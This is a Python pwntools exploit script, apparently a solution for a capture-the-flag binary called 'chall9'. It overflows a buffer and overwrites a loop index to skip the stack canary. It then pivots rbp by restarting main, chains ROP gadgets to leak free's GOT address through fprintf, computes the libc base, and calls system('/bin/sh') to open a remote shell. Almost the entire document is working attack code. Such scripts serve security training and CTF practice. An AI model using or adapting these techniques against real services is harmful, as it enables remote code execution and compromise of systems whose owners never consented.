#!/usr/bin/env python3
from pwn import *
import sys

HOST = ''
PORT = 40009

NUM_ATTEMPTS = 10

target_elf = ELF('../bin/chall9')
rop = ROP(target_elf)

ADDR_MAIN = 0x400c73
ADDR_RBP1 = 0x602698
ADDR_RBP2 = 0x602748
ADDR_RBP3 = 0x602310
ADDR_RBP4 = 0x602988

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

def exploit_attempt():
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT)
            target_libc = ELF('../bin/libc.so.6')
        else:
            io = target_elf.process()
            target_libc = target_elf.libc

        # step 1: fill the buffer and then overwrite the LSB of the i variable to skip
        #         over the stack canary at that point, lay down a little rop chain to
        #         restart the app with rbp under our control effectively pivoting only
        #         reference to local variables but not thw whole stack (that's later).
        ropchain  = p64(ADDR_RBP1)  # rbp
        ropchain += p64(ADDR_MAIN + 4)  # main addr (but after the saving of rbp)

        io.recvuntil(b': ')
        io.sendline(b'A'*1024 + b'\x10' + ropchain)

        # step 2: after we have restarted the binary with rbp under our control it will
        #         ensure all future references to local variables (including the canary)
        #         will be in a known memory location.
        #
        #         so this means we can write a future rop chain (and juggle another run
        #         getting around the canary again), then have stdout FILE * placed in
        #         that rop chain and then we can lay down the rest of the gadgets with
        #         yet another run.
        #

        # this is what will happen at the end of the run
        ropchain  = p64(ADDR_RBP2)  # rbp
        ropchain += p64(ADDR_MAIN + 4)  # main addr (but after the saving of rbp)

        # this is the rop chain being built to life the FILE *
        bnc  = cyclic(160)
        bnc += p64(rop.find_gadget(['pop rdi', 'ret']).address)
        bnc += cyclic(1024-len(bnc))

        pay  = p64(rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret']).address)
        pay += p64(ADDR_RBP3)

        io.recvuntil(': ')
        io.sendline(bnc + b'\x10' + ropchain + cyclic(168) + pay)

        bnc  = p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
        bnc += p64(target_elf.symbols['got.free'])
        bnc += p64(0)
        bnc += p64(rop.find_gadget(['ret']).address) * 112  # make enough space to run fwrite (quite deep stack chain)
        bnc += p64(target_elf.symbols['plt.fprintf'])
        bnc += p64(rop.find_gadget(['ret']).address)
        bnc += p64(rop.find_gadget(['pop rbp', 'ret']).address)
        bnc += p64(ADDR_RBP4)
        bnc += p64(rop.find_gadget(['pop rdi', 'ret']).address)
        bnc += p64(1)        # fake argc
        bnc += p64(ADDR_MAIN + 4)        # main addr
        bnc += cyclic(1024-len(bnc), alphabet=string.ascii_uppercase).encode('ascii')

        # step 3: collect the leaked data
        io.recvuntil(b': ')
        io.sendline(bnc)
        io.recvline()

        leak = io.recvn(6).ljust(8, b'\x00')
        leak = u64(leak)
        libc = leak - target_libc.symbols['free']

        log.info('Leak: %#014x', leak)
        log.info('Libc: %#014x', libc)

        # step 4: final payload
        pay  = p64(0)       # rbp
        pay += p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pay += p64(libc + next(target_libc.search(b'/bin/sh')))
        pay += p64(libc + target_libc.symbols['system'])

        io.recvuntil(b': ')
        io.sendline(b'\x00' * 1024 + b'\x10' + pay)
        io.recvline()

        # step 5: collect shell
        io.sendline(b'id')
        id_result = io.recvline()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            sys.exit(0)
        else:
            log.failure('Error: %s', id_result)
            sys.exit(1)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
